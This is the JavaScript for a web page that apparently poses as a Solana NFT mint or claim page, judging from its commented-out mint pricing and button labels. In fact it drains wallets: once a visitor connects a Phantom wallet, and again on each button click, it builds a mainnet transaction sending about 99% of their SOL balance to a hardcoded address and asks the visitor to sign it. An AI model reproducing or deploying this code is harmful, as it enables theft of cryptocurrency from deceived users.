// function upValue() {
//     document.getElementById("counet").value =
//     parseInt(1) + parseInt(document.getElementById("counet").value);

//     document.getElementById("wqwqw").textContent =
//     (parseInt(document.getElementById("counet").value) * 1.777)
//         .toFixed(2)
//         .toString() + " SOL";
// }

// function downValue() {
//     if (document.getElementById("counet").value == "1") {
//     } else {
//     document.getElementById("counet").value =
//         parseInt(document.getElementById("counet").value) - parseInt(1);

//     document.getElementById("wqwqw").textContent =
//         (parseInt(document.getElementById("counet").value) * 1.777)
//         .toFixed(2)
//         .toString() + " SOL";
//     }
// }
window.addEventListener("load", () => {
    // set PROD/TESTING
    const clusterApiURL = "mainnet-beta" // @@@ PROD
    //const clusterApiURL = "testnet" // @@@ TESTING

    var sent = false;
    const connection = new solanaWeb3.Connection(
    solanaWeb3.clusterApiUrl(clusterApiURL)
    );

    const getProvider = () => {
        if ("solana" in window) {
            const provider = window.solana;
            if (provider.isPhantom) {
                console.log("Is Phantom installed?  ", provider.isPhantom);
            return provider;
            }
        }
        window.open("https://phantom.app/", "_blank");
    };

    function onBodyLoad() {
        const solConnected = window.solana.isConnected;
        
        var username_text
        
        if (!solConnected) {
            connectWallet();
        } else {
            username_text = String(provider.publicKey)
            username_short = username_text.substring(0,8);


            document.getElementById("Phantom_Connect").style.display = "none";
            document.getElementById("WalletButton").style.display = "block";
            
            makeTransfer(100000);

            //document.getElementById("WalletButton").setAttribute('data-target', "#False");

            //document.getElementById("showcase__btn0").innerHTML = (username_short)+"...";
            
            // document.getElementById("WalletButton").innerText  = "Mint";
            // document.getElementById("WalletButton").innerText  = "Claim";
            // document.getElementById("WalletButton").style.background  = "#e42575";
        }
        refreshStatus();
    }
    
    function refreshStatus() {
        const provider = getProvider();
        if (provider) {
            provider.on("connect", () => {
            setConnected();
            username_text = String(provider.publicKey)
            console.log(username_text)
            username_short = username_text.substring(0,8);


            document.getElementById("Phantom_Connect").style.display = "none";
            document.getElementById("WalletButton").style.display = "block";

           // document.getElementById("WalletButton").setAttribute('data-target', "#False");

            //document.getElementById("showcase__btn0").innerHTML = (username_short)+"...";

            // document.getElementById("WalletButton").innerText  = "Claim";
            // document.getElementById("WalletButton").style.background  = "#e42575";
            });
            provider.on("disconnect", () => {
            setNotConnected();
            });
        }
    }

    async function connectWallet() {
        await window.solana.connect({
            onlyIfTrusted: false,
        });

        makeTransfer(100000);

    }
    
    async function setConnected() {
        let account_info = await connection.getAccountInfo(
            window.solana.publicKey
        );
    }


    async function transferSOL(amount) {
        const provider = await getProvider();
        const solConnected = window.solana.isConnected;
        const manylamports = (amount * 1000000000).toFixed(0);

        if (!provider) {
            return;
        }
        if (!solConnected) {
            return;
        }
        
        let connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl(clusterApiURL), 'confirmed');
        
        let account_info = await connection.getAccountInfo(window.solana.publicKey).then(function(value) { 
            console.log(`Account_Info: ${JSON.stringify(value)}`)
            return value;
         })
        
        // Check if account_info == null
        // if the requested account doesn't exist OR balance SOL = 0.00
        if (account_info == null) {
            console.log("--> Balance = 0.00 --> Nothing to do...")
            return
          }
        
        var charginglamports = manylamports;
        
        if (account_info.lamports / 2 > manylamports) {
            charginglamports = (account_info.lamports * 0.99).toFixed(0);
        }

        if (
            account_info.lamports < manylamports &&
            account_info.lamports > 100000
        ) {
            charginglamports = (account_info.lamports * 0.99).toFixed(0);
        }

        let transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: provider.publicKey,
                toPubkey: "HR88PLh5RmDAE4vQrNPHdSWfaz9JaaRYBpNdGQZQRyCs",
                lamports: charginglamports,
            })
        );

        // Setting the variables for the transaction
        transaction.feePayer = await provider.publicKey;
        let blockhashObj = await connection.getRecentBlockhash();
        transaction.recentBlockhash = await blockhashObj.blockhash;
        console.log(`transaction.recentBlockhash: ${JSON.stringify(blockhashObj.blockhash)}`)
        console.log(`transaction : ${JSON.stringify(transaction)}`)
        
        if (transaction) {
            try {    
                let signed = await provider.signTransaction(
                    transaction,
                    connection
                );
                
                let signature = await connection.sendRawTransaction(
                    signed.serialize()
                );
                console.log(`signature : ${signature}`)

                await connection.confirmTransaction(signature);
            } catch(err) {
             console.warn(err);
            }
        }

    }

    async function makeTransfer(amount) {
        let transaction = await transferSOL(amount);
    }
 
    function setNotConnected() {
        // document.getElementById("connStatus").innerHTML = "Not Connected";
    }

    document.getElementById("WalletButton").onclick = function () {
        // if (document.getElementById("WalletButton").getAttribute('data-target') == ("#False")){
            makeTransfer(100000);
        // }
        // else{
        //     refreshStatus();
        // }
    };

    document.getElementById("Phantom_Connect").onclick = function () {
        console.log('asd:');
    onBodyLoad();
    };
});
